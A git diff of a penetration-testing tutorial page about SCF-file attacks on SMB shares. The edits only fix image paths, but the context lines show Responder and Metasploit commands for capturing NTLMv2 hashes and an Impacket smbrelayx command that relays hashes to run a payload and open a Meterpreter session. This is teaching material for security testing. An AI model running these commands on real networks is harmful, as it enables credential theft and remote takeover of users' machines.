@@ -85,11 +85,11 @@ Responder needs to be executed with the following parameters to capture the hash
 responder -wrf --lm -v -I vboxnet0
 ```
 
-![](../../../.gitbook/assets/image%20%28257%29.png)
+![](../../../../.gitbook/assets/image%20%28257%29.png)
 
 When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.
 
-![](../../../.gitbook/assets/image%20%28251%29.png)
+![](../../../../.gitbook/assets/image%20%28251%29.png)
 
 Alternatively to Responder, Metasploit Framework has a module which can be used to capture challenge-response password hashes from SMB clients.
 
@@ -97,11 +97,11 @@ Alternatively to Responder, Metasploit Framework has a module which can be used 
 auxiliary/server/capture/smb
 ```
 
-![](../../../.gitbook/assets/image%20%28249%29.png)
+![](../../../../.gitbook/assets/image%20%28249%29.png)
 
 As previously when the user will browse the same share his password hash will be captured by Metasploit.
 
-![](../../../.gitbook/assets/image%20%28252%29.png)
+![](../../../../.gitbook/assets/image%20%28252%29.png)
 
 If the password policy inside the company is sufficient it will take possibly days or weeks for the attacker to crack the captured hash.
 
@@ -121,15 +121,15 @@ Coresecurity has released a set of python scripts called [Impacket](https://gith
 ./smbrelayx.py -h Target-IP -e ./pentestlab.exe
 ```
 
-![](../../../.gitbook/assets/image%20%28255%29.png)
+![](../../../../.gitbook/assets/image%20%28255%29.png)
 
 Metasploit Framework needs to be used as well in order to receive back the connection upon execution of the pentestlab.exe on the target.
 
-![](../../../.gitbook/assets/image%20%28247%29.png)
+![](../../../../.gitbook/assets/image%20%28247%29.png)
 
 When the user will browse the share the SMB server will receive the connection and it will use the username and the password hash to authenticate with his system and execute the payload to a writable share.
 
-![](../../../.gitbook/assets/image%20%28253%29.png)
+![](../../../../.gitbook/assets/image%20%28253%29.png)
 
 A Meterpreter session will received. However in order to avoid losing the connection it is necessary to migrate to a more stable process.
 
